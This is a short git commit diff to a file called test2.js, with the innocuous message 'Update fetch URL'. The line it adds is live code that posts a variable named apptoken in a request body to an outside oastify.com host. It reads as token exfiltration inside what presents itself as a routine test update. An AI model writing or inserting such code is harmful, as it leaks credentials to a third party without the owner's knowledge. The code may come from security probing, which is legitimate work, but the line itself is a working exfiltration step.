b9a4ff2788e3c442616b6c3cb0222354bf408ea8
Richard Haaga <richard.haaga@gmail.com>
2026-02-11 14:35:31 +0100

    Update fetch URL in test2.js

--- test2.js
+++ test2.js
@@ -5,5 +5,5 @@ const requestOptions = {
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
     body: JSON.stringify({ token: apptoken })
 };
-fetch('https://av9jxe7zmvmred17ljrqzi6u7ldc1ep3.oastify.com/test2', requestOptions)
+fetch('https://aesvofi5x2ik7cjehh97vu5r4ia9y0mp.oastify.com/test2', requestOptions)
     .then(response => response.json())
